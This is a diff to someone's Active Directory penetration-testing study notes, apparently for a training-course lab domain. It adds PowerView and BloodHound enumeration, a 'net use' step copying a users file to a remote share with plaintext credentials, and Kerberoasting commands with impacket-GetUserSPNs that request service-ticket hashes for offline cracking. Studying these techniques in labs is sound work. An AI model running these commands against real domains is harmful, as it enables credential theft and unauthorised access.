@@ -84,7 +84,7 @@ Import-Module .\PowerView.ps1
 
 get-netdomain
 Get-DomainPolicy # Get password policies and kerberos to understand potential attacks and defenses and considerations
-Get-DomainPolicy."system access" # Didn't work for me
+(Get-DomainPolicy)."system access" #doesn't show anything
 Get-NetUser # Similar can be accomplished natively with:
 Get-CimInstance -ClassName Win32_UserAccount -Filter "LocalAccount = 'False'"
 cmd net user /domain
@@ -101,13 +101,57 @@ Get-NetGroup -Identity *admin* | select samaccountname
 Get-NetGroupMember -Identity "Domain Admins" # Newer syntax
 # If confused, use Get-Help <powerview command>
 example: Get-Help Get-NetGroup
-Invoke-ShareFinder
+Invoke-ShareFinder # works but takes like 8-10 mins
+Get-NetGPO
+Get-NetGPO | select displayname, whenchanged
+
+BloodHound (On Kali)
+sudo apt install -y bloodhound
+sudo neo4j console #def credz neo4j:ne4j, change pw DO NOT USE SYSTEM PASSWORD! As you will need it plaintext later!
+bloodhound-start
+
+#Fix kali bloodhound
+sudo runuser -u postgres -- psql -c 'ALTER DATABASE postgres REFRESH COLLATION VERSION; ALTER DATABASE template1 REFRESH COLLATION VERSION;'
+sudo systemctl restart postgresql
+sudo nano /etc/bhapi/bhapi.json # change neo4j password
+sudo bloodhound-setup
+#separate credentials for bloodhound legacy, in kali install package is admin:admin
+
+net use M: \\10.10.10.100\share /user:chepe Password123
+copy c:\user\public\users.txt M:\
+net use M: /delete
+#To transfer file. Bless net use
+
+#Session collection in BloodHound seems to be heavily restricted even for local admin accounts
+
+
+Attacking AD post compromise attacks
+Pass the Hash
+
+Kerberos fix Kali
+sudo timedatectl set-ntp off
+sudo rdate -n <dc-ip>
+
+Kerberoasting
+# Because service tickets are encrypted with service hash, kerberoasting needs valid user to request a service ticket
+# Which doesn't have to be sent to the service, and can be cracked offline to obtain the hash of the service
+Target account needs SPN (service principal name) for kerberos to identify the service account and interact with it
+UPN (User)
+impacket-GetUserSPNs marvel.local/fcastle:Password1 -dc-ip 192.168.1.10
+impacket-GetUserSPNs target.local/username:password -dc-ip <Domain_Controller_IP> -request -outputfile kerberoast_hashes.txt
+# Due to recent MS hardening RC4 won't work
+# Must derive AES key from user pass
+https://raw.githubusercontent.com/TacticalGator/ADKeygen/refs/heads/main/ADKeygen.py
+
 
 ###
 Mini meta notes:
 Learn to troubleshoot and diagnose failing tools
 Learn to use documentation and built in tools to find correct syntax and commands
 Understand what TCM is looking for, and why?
+
+###
+#Learn more shares
 
 
 #####
